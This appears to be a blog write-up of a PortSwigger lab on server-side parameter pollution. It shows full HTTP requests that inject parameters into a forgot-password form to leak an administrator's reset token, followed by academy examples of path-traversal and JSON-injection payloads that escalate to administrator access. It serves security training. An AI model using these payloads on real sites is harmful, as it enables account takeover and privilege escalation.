---
layout: post
title: "Server-Side Parameter Pollution"
date: 2025-03-28 00:00:00 +0100
categories: [portswigger, hacking]
tags: [ctf, server-side parameter pollution, injection, web]
---

![pp](pics/param-pollution.png)

### Server-Side Parameter Pollution Intro

Currently working not only with tryhackme.com but with portswigger.net stuff also so there is a Server-Side Parameter Pollution topic in API testing so there was a thing I wanted to note from the lab.

Server-Side Parameter Pollution (SSPP) is a web security vulnerability where an attacker manipulates parameters sent to the server to interfere with backend logic. Unlike Client-Side Parameter Pollution (CSPP), which affects JavaScript and browser behavior, SSPP targets server-side applications.

From the Portswigger academy:

- To test for server-side parameter pollution in the query string, place query syntax characters like `#`, `&`, and `=` in your input and observe how the application responds, try to inject invalid parameters and override existing
- To confirm whether the application is vulnerable to server-side parameter pollution, you could try to override the original parameter. Do this by injecting a second parameter with the same name. The impact of this depends on how the application processes the second parameter. This varies across different web technologies.

```
Examples:
    PHP parses the last parameter only. This would result in a search for second parameter.
    ASP.NET combines both parameters. This would result in a user search for first,second, which might result in an Invalid username error message.
    Node.js / express parses the first parameter only. This would result in a user search for first, giving an unchanged result.
```

### Exploitation
There was a link for those who forgot password, so using it from burp:

Here is our initial request (PING):

```
POST /forgot-password HTTP/2
Host: 0abf00a203f9357d800b8ae20009000b.web-security-academy.net
Cookie: session=Xm6CE6vD90tpPiCEMDBjT8YRHYxuxOTF
Content-Length: 82
Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
Content-Type: x-www-form-urlencoded
Accept-Language: en-US
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Origin: https://0abf00a203f9357d800b8ae20009000b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0abf00a203f9357d800b8ae20009000b.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=lCh44lToAx63BikFSr0KR1GTTbZfK0eP&username=administrator
```

And response (PONG) we get:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"type":"email","result":"*****@normal-user.net"}
```

Let's play with a payload (I intentionaly skip the body because we don't need to change it for now) add `&` (url encoded `%26`) with same parameter:

PING:

```
...

csrf=lCh44lToAx63BikFSr0KR1GTTbZfK0eP&username=administrator%26username=carlos
```

PONG:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"type":"email","result":"*****@normal-user.net"}
```

Since we don't have any error, probably we could try to truncate our request using `#` (url encoded `%23`)

PING:

```
...

csrf=lCh44lToAx63BikFSr0KR1GTTbZfK0eP&username=administrator%26username=carlos%23
```

PONG:
```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33

{"error": "Field not specified."}
```

Let's specify `field` in this case:

PING:

```
...

csrf=lCh44lToAx63BikFSr0KR1GTTbZfK0eP&username=administrator%26field=username%23
```

PONG:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33

{"type":"username","result":"administrator"}
```

Ok so we have a pattern to work with, if you will pay attention to forgotPassword.js you will find a new endpoint: `/forgot-password?reset_token=${resetToken}` so let's try `reset_token`as a field:

PING:

```
...

csrf=lCh44lToAx63BikFSr0KR1GTTbZfK0eP&username=administrator%26field=reset_token%23
```

PONG:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33

{"type":"reset_token","result":"54ru8lf8w9cwqf3mlehks7x0i2h4r9fg"}
```

Now we will visit an endpoint using our token and change password to a new one:

`https://0abf00a203f9357d800b8ae20009000b.web-security-academy.net/forgot-password?reset_token=54ru8lf8w9cwqf3mlehks7x0i2h4r9fg`

### Some more theory with examples from the PortSwigger academy
**Server-Side parameter pollution in REST paths**

Consider an application that enables you to edit user profiles based on their username. Requests are sent to the following endpoint:
`GET /edit_profile.php?name=peter`

This results in the following server-side request: `GET /api/private/users/peter`

An attacker may be able to manipulate server-side URL path parameters to exploit the API. To test for this vulnerability, add path traversal sequences to modify parameters and observe how the application responds.

You could submit URL-encoded `peter/../admin` as the value of the name parameter: `GET /edit_profile.php?name=peter%2f..%2fadmin`

This may result in the following server-side request: `GET /api/private/users/peter/../admin`

If the server-side client or back-end API normalize this path, it may be resolved to `/api/private/users/admin`.

**Server-Side parameter pollution in structured data formats**

Consider an application that enables users to edit their profile, then applies their changes with a request to a server-side API. When you edit your name, your browser makes the following request:

```
POST /myaccount
name=peter
```

This results in the following server-side request:

```
PATCH /users/7312/update
{"name":"peter"}
```

You can attempt to add the access_level parameter to the request as follows:

```
POST /myaccount
name=peter","access_level":"administrator
```

If the user input is added to the server-side JSON data without adequate validation or sanitization, this results in the following server-side request:

```
PATCH /users/7312/update
{name="peter","access_level":"administrator"}
```

Consider a similar example, but where the client-side user input is in JSON data. When you edit your name, your browser makes the following request:

```
POST /myaccount
{"name": "peter"}
```

This results in the following server-side request:

```
PATCH /users/7312/update
{"name":"peter"}
```

You can attempt to add the access_level parameter to the request as follows:

```
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```

If the user input is decoded, then added to the server-side JSON data without adequate encoding, this results in the following server-side request:

```
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}
```